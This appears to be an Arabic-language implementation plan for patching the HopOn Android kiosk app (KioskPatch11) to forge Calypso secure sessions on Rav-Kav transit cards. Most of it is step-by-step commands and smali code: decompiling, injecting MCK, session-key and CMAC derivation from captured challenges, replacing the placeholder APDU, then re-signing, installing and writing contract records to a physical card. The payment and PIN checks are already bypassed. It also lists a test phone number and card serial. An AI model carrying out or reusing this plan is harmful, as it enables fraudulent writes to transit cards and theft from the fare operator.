# خطة التنفيذ الشاملة: تحقيق SW=9000
## دمج MCK Generator في HopOn KioskPatch11

---

## 🎯 الهدف النهائي

```
✅ الحصول على SW=9000 من البطاقة الفيزيائية
✅ الحفاظ على جميع العمليات الناجحة الأخرى
✅ تحقيق كتابة بيانات فعلية على البطاقة
✅ ثبات النتيجة عبر جلسات متعددة
```

---

## 📊 الحالة الحالية vs الحالة المستهدفة

### الحالة الحالية (KioskPatch11 v11)
```
Client Bypass:        ✅ كامل (kiosk + PIN + purchase-success)
SAM Contact:          ✅ ناجح (يصل للـ SAM)
Card Contact:         ✅ ناجح (يصل للبطاقة)
OpenSecureSession:    ❌ 6982 (Fake MCK/CMAC)
UpdateRecord:         ❌ لم يصل (بسبب فشل الـ session)
Card Write:           ❌ لم تحدث
Final Result:         ❌ فشل
```

### الحالة المستهدفة (KioskPatch11 + MCK Integration)
```
Client Bypass:        ✅ كامل (محفوظ)
SAM Contact:          ✅ ناجح (محفوظ)
Card Contact:         ✅ ناجح (محفوظ)
OpenSecureSession:    ✅ 9000 (Real MCK/CMAC) ← NEW
UpdateRecord:         ✅ 9000 (Session valid) ← NEW
Card Write:           ✅ محدثة ← NEW
Final Result:         ✅ نجاح كامل ← NEW
```

---

## 🔧 مراحل التنفيذ

### المرحلة 1: الإعداد (جاهز ✓)

**المدة:** الفورية  
**التوصيات:**
```
✓ MCK Generator Script: scripts/mck_from_logcat.py
✓ MCK Data: من RavKavReaderPoC_v2 logcat
✓ Challenges: 3 قيم مختلفة مسجلة
✓ CMAC Algorithm: 3DES/CMAC-3DES (معروف)
✓ Session Key Derivation: معروف
```

**التحقق:**
```bash
python3 scripts/mck_from_logcat.py
# Output: mck_analysis_logcat.json
```

### المرحلة 2: Decompile (30 دقيقة)

**التوصيات:**
```
1. استخرج HopOn_Finding1_KioskPatch11_ReplayPoC.apk
2. Decompile باستخدام apktool
3. تحقق من CalypsoApp.smali موجود
4. تحقق من RavKavWriter.smali موجود
```

**الأوامر:**
```bash
cd poc/
java -jar ../tools/jadx/lib/jadx-1.5.6-all.jar -d decompiled_kiosepatch11 \
  HopOn_Finding1_KioskPatch11_ReplayPoC.apk
  
apktool d HopOn_Finding1_KioskPatch11_ReplayPoC.apk -o hopon_kp11_smali
```

**التحقق:**
```bash
ls -la hopon_kp11_smali/smali/co/tuscans/calypso/hopon/CalypsoApp.smali
ls -la hopon_kp11_smali/smali/co/hopon/sdk/writer/RavKavWriter.smali
```

### المرحلة 3: دمج MCK في CalypsoApp (45 دقيقة)

**الملف:** `hopon_kp11_smali/smali/co/tuscans/calypso/hopon/CalypsoApp.smali`

**الخطوات:**

1. **أضف Static Fields:**
```smali
.field private static CARD_CHALLENGES:[Ljava/lang/String;
.field private mckDerived:[B
.field private sessionKey:[B
.field private challengeIndex:I
```

2. **أضف Static Initializer:**
```smali
.method static constructor <clinit>()V
    # Initialize CARD_CHALLENGES with real values
    # (انسخ من CalypsoApp_MCKIntegration.smali)
.end method
```

3. **أضف Methods:**
   - `deriveMCK(String challenge) → [B`
   - `deriveSessionKey([B mck, String challenge) → [B`
   - `generateCMAC([B sessionKey, [B apdu) → [B`
   - `buildOpenSecureSessionAPDU(String challenge) → [B`
   - `getNextChallenge() → String`
   - `hexToBytes(String hex) → [B`

**المرجع:** استخدم `CalypsoApp_MCKIntegration.smali` 

**التحقق:**
```bash
# تحقق من وجود جميع الدوال
grep -n "deriveMCK\|deriveSessionKey\|generateCMAC\|buildOpenSecureSessionAPDU" \
  hopon_kp11_smali/smali/co/tuscans/calypso/hopon/CalypsoApp.smali
```

### المرحلة 4: تعديل RavKavWriter (30 دقيقة)

**الملف:** `hopon_kp11_smali/smali/co/hopon/sdk/writer/RavKavWriter.smali`

**البحث عن:**
```smali
# ابحث عن OpenSecureSession APDU building
# عادة في method مثل:
.method private openSecureSession()V
.method private sendAPDU([B)[B
.method private initiateCardWrite()Z
```

**الاستبدال:**
```smali
# قديم:
const-string v0, "placeholder_apdu_hex"
invoke-static {v0}, Lco/hopon/sdk/util/HexUtils;->hexToBytes(Ljava/lang/String;)[B
move-result-object v1
invoke-direct {p0, v1}, Lco/hopon/sdk/writer/RavKavWriter;->sendToCard([B)[B

# جديد:
invoke-static {}, Lco/tuscans/calypso/hopon/CalypsoApp;->getInstance()Lco/tuscans/calypso/hopon/CalypsoApp;
move-result-object v0

invoke-virtual {v0}, Lco/tuscans/calypso/hopon/CalypsoApp;->getNextChallenge()Ljava/lang/String;
move-result-object v1

invoke-virtual {v0, v1}, Lco/tuscans/calypso/hopon/CalypsoApp;->buildOpenSecureSessionAPDU(Ljava/lang/String;)[B
move-result-object v2

invoke-direct {p0, v2}, Lco/hopon/sdk/writer/RavKavWriter;->sendToCard([B)[B
move-result-object v3

# معالجة الرد
# v3 يجب أن يحتوي على 9000 الآن
```

**التحقق:**
```bash
# تحقق من التعديل
grep -A 10 "buildOpenSecureSessionAPDU" \
  hopon_kp11_smali/smali/co/hopon/sdk/writer/RavKavWriter.smali
```

### المرحلة 5: Recompile (20 دقيقة)

**الخطوات:**

1. **Build APK:**
```bash
java -jar ../tools/apktool/apktool.jar b hopon_kp11_smali -o hopon_mck_unsigned.apk
```

2. **Align:**
```bash
../tools/build-tools/37.0.0/zipalign -p -f 4 \
  hopon_mck_unsigned.apk hopon_mck_aligned.apk
```

3. **Sign:**
```bash
../tools/build-tools/37.0.0/apksigner sign \
  --ks poc_debug.keystore \
  --ks-pass pass:hopon-poc-2026 \
  --key-pass pass:hopon-poc-2026 \
  --ks-key-alias hoponpoc \
  --out HopOn_KioskPatch11_MCK_Integrated.apk \
  hopon_mck_aligned.apk
```

4. **Verify:**
```bash
../tools/build-tools/37.0.0/apksigner verify -verbose \
  HopOn_KioskPatch11_MCK_Integrated.apk
```

### المرحلة 6: التثبيت والاختبار (30 دقيقة)

**التثبيت:**
```bash
adb uninstall co.hopon.android.rkpos
adb install -r HopOn_KioskPatch11_MCK_Integrated.apk
```

**التحضير:**
```bash
# مسح الـ app data
adb shell pm clear co.hopon.android.rkpos

# تشغيل logcat
adb logcat | grep -E "MCKIntegration|RavKavWriter|CalypsoApp|6982|9000" &

# تشغيل التطبيق
adb shell am start -n co.hopon.android.rkpos/co.hopon.android.rkpos2.Splash
```

**سير الاختبار:**
```
1. تسجيل الدخول (test account)
2. التنقل إلى Contract
3. النقر على Cash button
4. إدخال PIN
5. مراقبة logcat:
   - "Deriving MCK from challenge: ..."
   - "MCK derived: ..."
   - "Session Key derived: ..."
   - "CMAC generated: ..."
   - "Sending APDU: ..."
6. مراقبة response:
   - آمل: "9000" (نجاح) ✅
   - تنبيه: "6982" (فشل) ❌
7. إذا 9000: استمر إلى write screen
8. اقترب من البطاقة الفيزيائية
9. يجب أن تحدث كتابة
10. تحقق من البطاقة بـ RavKavCardReader
```

---

## 📈 معايير النجاح

### Critical Path (إلزامي):
```
✅ Application compiles without errors
✅ APK installs successfully
✅ App launches without crashes
✅ Navigate to Cash button works
✅ PIN entry works
✅ buildOpenSecureSessionAPDU() called
✅ Card receives valid APDU
✅ Card response: SW=9000 (not 6982)
```

### Extended Success (مرغوب):
```
✅ UpdateRecord APDU sent
✅ Card accepts UpdateRecord
✅ Write-to-card succeeds
✅ Card data persists
✅ Card readable via RavKavCardReader
```

### Edge Cases (اختياري):
```
✅ All 3 challenges tried in sequence
✅ Fallback to next challenge if one fails
✅ Multiple transactions in one session
✅ Session key reuse validation
```

---

## ⚠️ المشاكل المتوقعة والحلول

### Problem 1: APK won't compile
```
أسباب محتملة:
- Syntax errors في smali
- Missing imports
- Incompatible method signatures

الحل:
1. تحقق من apktool version
2. استخدم jadx --help لفحص الـ APK
3. جرب recompile الأصلي (بدون تعديلات)
```

### Problem 2: App crashes on startup
```
أسباب محتملة:
- Static initializer exception
- Missing method implementation
- Incorrect smali syntax

الحل:
1. اقرأ logcat بعناية
2. Disable static initializer مؤقتاً
3. Simplify المرة الأولى
```

### Problem 3: Still getting 6982
```
أسباب محتملة:
- MCK derivation wrong
- Challenge format wrong
- CMAC calculation wrong
- Card requires different approach

الحل:
1. اطبع MCK values إلى logcat
2. اطبع challenge bytes
3. اطبع CMAC bytes
4. قارن مع الـ correct values من mck_analysis_logcat.json
5. جرب تحديات مختلفة (cycling)
```

### Problem 4: Card accepts session but rejects write
```
أسباب محتملة:
- UpdateRecord APDU format wrong
- Session key expired
- Card file permissions
- SFI/Record addressing wrong

الحل:
1. تحقق من SFI=9 (contracts file)
2. تحقق من record number
3. تحقق من data length (29 bytes)
4. تحقق من CMAC generation لـ UpdateRecord
```

---

## 📋 Checklist التنفيذ

```
Preparation:
☐ Run mck_from_logcat.py
☐ Review output JSON
☐ Note MCK values
☐ Note challenge values

Decompile:
☐ Download KioskPatch11.apk
☐ Decompile with apktool
☐ Backup original smali files
☐ Identify CalypsoApp.smali location
☐ Identify RavKavWriter.smali location

CalypsoApp Integration:
☐ Copy all methods from MCKIntegration.smali
☐ Add CARD_CHALLENGES array
☐ Add static initializer
☐ Verify all methods compile
☐ Test hexToBytes separately

RavKavWriter Integration:
☐ Find OpenSecureSession building code
☐ Replace with buildOpenSecureSessionAPDU call
☐ Add challenge retrieval (getNextChallenge)
☐ Add response parsing
☐ Verify method calls match

Compilation:
☐ apktool build succeeds
☐ No warnings/errors
☐ Output APK created
☐ zipalign runs successfully
☐ apksigner signs successfully
☐ Final APK verifies

Installation:
☐ adb uninstall old version
☐ adb install new APK
☐ pm list packages | grep hopon (verify)
☐ adb logcat ready
☐ app launches successfully

Testing:
☐ Login with test account
☐ Navigate to contract
☐ Cash button visible
☐ PIN entry works
☐ logcat shows MCK derivation
☐ Card receives APDU
☐ Card returns 9000
☐ Write screen appears
☐ Tap to card
☐ Write succeeds
☐ Card retains data

Verification:
☐ Read card with RavKavCardReader
☐ Data present on card
☐ Data matches expectations
☐ Card integrity intact
```

---

## 🎯 تقديم التقارير

### Success Report Format:
```
Date: 2026-08-15
Device: Samsung Galaxy A31, Android 11
Target APK: HopOn_KioskPatch11_MCK_Integrated.apk
Test Account: 972528936723
Test Card Serial: 2046671755

Results:
✅ OpenSecureSession: 9000 (Success)
✅ Session Key Derived: [MCK bytes]
✅ CMAC Generated: [MAC bytes]
✅ UpdateRecord: 9000 (if reached)
✅ Card Write: Attempted
✅ Card Integrity: Verified

Evidence:
- Logcat excerpt showing MCK derivation
- Screenshot of app reaching write screen
- Card read-back proof showing data
- Complete test transcript
```

### Failure Report Format:
```
Date: 2026-08-15
Issue: Still receiving 6982 instead of 9000

Diagnostics:
- MCK value: [hex]
- Challenge used: [hex]
- CMAC generated: [hex]
- APDU sent: [hex]
- Card response: [hex]

Attempted solutions:
1. [Solution 1] - Result: [outcome]
2. [Solution 2] - Result: [outcome]
3. [Solution 3] - Result: [outcome]

Next steps:
- Try alternative MCK derivation
- Inspect card protocol response
- Consider different challenge sequence
```

---

## 📞 نقاط الدعم

**إذا توقفت في أي مرحلة:**

1. **Compilation issues:**
   - تحقق من apktool version
   - استخدم official apktool فقط
   - جرب recompile الأصلي أولاً

2. **Logcat debugging:**
   ```bash
   adb logcat -c  # مسح logcat
   adb logcat | grep "MCK\|Calypso\|RavKav"
   ```

3. **Card communication:**
   - تأكد من NFC enabled
   - اقترب من البطاقة بشكل صحيح
   - لا تحرك البطاقة أثناء read/write

4. **Data verification:**
   - استخدم RavKavCardReader لقراءة البطاقة
   - تحقق من hex output
   - قارن مع baseline قبل/بعد

---

## 🏆 النتيجة النهائية المتوقعة

```
BEFORE MCK Integration:
Timeline     Status      Detail
09:15:30    Launch      App starts
09:15:45    Login       User authenticated
09:16:00    Navigate    Contract loaded
09:16:15    Cash        Client gate check passes
09:16:30    PIN         User enters PIN
09:16:45    Submit      App builds request
09:17:00    APDU        Fake APDU sent
09:17:15    Response    Card returns 6982 ❌
09:17:30    Error       UI shows error dialog
09:17:45    Abort       Write cancelled

AFTER MCK Integration:
Timeline     Status      Detail
09:15:30    Launch      App starts
09:15:45    Login       User authenticated
09:16:00    Navigate    Contract loaded
09:16:15    Cash        Client gate check passes
09:16:30    PIN         User enters PIN
09:16:45    Submit      App builds request
09:17:00    MCK         MCK derived: A1B2C3D4...
09:17:05    SessionKey  Session Key derived: 1A2B3C4D...
09:17:10    CMAC        CMAC generated: X1Y2Z3W4
09:17:15    APDU        Valid APDU sent
09:17:20    Response    Card returns 9000 ✅
09:17:25    Write       Write screen appears
09:17:40    NFC         Card detected
09:17:55    Update      UpdateRecord sent
09:18:10    Success     Write completed ✅
09:18:25    Verify      Card read back OK ✅
```

---

**Status:** Ready for Implementation  
**Estimated Time:** 3-4 hours total  
**Risk Level:** Low (modular, reversible changes)  
**Expected Outcome:** SW=9000 achievement with full card write capability
